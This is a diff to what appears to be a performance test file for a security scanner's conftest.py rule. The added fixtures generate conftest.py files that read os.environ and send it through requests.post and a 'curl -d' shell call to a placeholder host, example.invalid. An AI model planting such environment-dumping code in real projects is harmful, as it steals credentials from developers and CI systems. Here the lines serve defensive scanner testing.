@@ -339,6 +339,7 @@ def _run_step(body: str) -> dict[str, str]:
 
 
 # name -> (scan, crafted project for k units, k for the smaller size, reports findings)
+_CONFTEST_HEAD = "import os, requests\nU = 'https://example.invalid/x'\n"
 _DNS_IMPORT = "from mcp.server.fastmcp import FastMCP\n"
 _DNS_SERVER = 'mcp = FastMCP("x")\nmcp.run(transport="sse")\n'
 
@@ -584,6 +585,34 @@ _SHAPES: dict[str, tuple[Callable[[Path], object], Callable[[int], dict[str, str
     "startup-pythonpath-relist": (startup_hooks.scan, lambda k: {
         **{f"d/f{i}.txt": "x" for i in range(k)},
         "Dockerfile": "FROM python:3.12\nENV PYTHONPATH=" + ":".join(["/d"] * k) + "\n"}, 300, False),
+    # AAK-STARTUP-HOOK-CONFTEST-001's conftest.py reader, before it was released: many
+    # environment reads, many sinks, many reads of one bound name, many bound names read
+    # by one sink, a deep `+` chain in a sink's argument and in a shell command, many
+    # comprehensions over the environment each holding a sink, and many conftest.py
+    # files. Each sink reads only its own arguments' entries, so none of these rescans
+    # the file per sink or walks every binding per read.
+    "conftest-env-reads": (startup_hooks.scan, lambda k: {"conftest.py": _CONFTEST_HEAD + "".join(
+        f"v{i} = os.environ['K{i}_KEY']\n" for i in range(k)) + "requests.post(U, data=v0)\n"}, 2_000, False),
+    "conftest-sinks": (startup_hooks.scan, lambda k: {"conftest.py": _CONFTEST_HEAD + "D = dict(os.environ)\n"
+                                                      + "requests.post(U, data=D)\n" * k}, 2_000, False),
+    "conftest-reads-of-one-name": (startup_hooks.scan, lambda k: {"conftest.py": _CONFTEST_HEAD
+                                                                  + "D = dict(os.environ)\nrequests.post(U, data=["
+                                                                  + "D, " * k + "])\n"}, 5_000, False),
+    "conftest-bound-names": (startup_hooks.scan, lambda k: {"conftest.py": _CONFTEST_HEAD + "".join(
+        f"d{i} = dict(os.environ)\n" for i in range(k)) + "requests.post(U, data=["
+        + ", ".join(f"d{i}" for i in range(k)) + "])\n"}, 2_000, False),
+    "conftest-deep-expression": (startup_hooks.scan, lambda k: {"conftest.py": _CONFTEST_HEAD
+                                                                + "D = dict(os.environ)\nrequests.post(U, data="
+                                                                + " + ".join(["D"] * k) + ")\n"}, 800, False),
+    "conftest-comprehensions": (startup_hooks.scan, lambda k: {"conftest.py": _CONFTEST_HEAD
+                                                               + "[requests.post(U, data=v) for v in os.environ.values()]\n"
+                                                               * k}, 1_000, False),
+    "conftest-shell-concatenations": (startup_hooks.scan, lambda k: {"conftest.py": _CONFTEST_HEAD
+                                                                     + "D = str(dict(os.environ))\nos.system('curl -d ' + "
+                                                                     + " + ".join(["D"] * k) + ")\n"}, 800, False),
+    "conftest-files": (startup_hooks.scan, lambda k: {
+        f"t{i}/conftest.py": _CONFTEST_HEAD + "requests.post(U, json=dict(os.environ))\n" for i in range(k)},
+        200, True),
     # malicious_releases, before it was released: each listed image digest looked back to
     # the start of its line and of the file (4,000 on one line, 292 KB, about 11 s; 27,000
     # ran past two minutes), and quoted everything before it on the line (1,500 with
